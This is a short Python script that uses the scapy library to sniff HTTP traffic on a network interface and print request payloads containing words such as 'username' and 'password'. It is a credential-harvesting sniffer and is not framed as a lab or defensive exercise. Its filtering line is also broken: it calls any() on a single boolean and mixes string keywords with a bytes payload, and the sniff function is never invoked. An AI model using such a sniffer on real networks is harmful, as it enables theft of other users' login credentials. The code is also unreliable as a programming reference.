import scapy.all as scapy
from scapy.layers import http

def sniff_packet(interface):
    scapy.sniff(iface=interface, store=False, prn=analyze_packet)

def analyze_packet(packet):
    
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            keywords = ["username", "login", "user", "password"]
            load_field = packet[scapy.Raw].load
            load_filter_result = [load_field for word in keywords if any(word in load_field)]
            print(load_filter_result)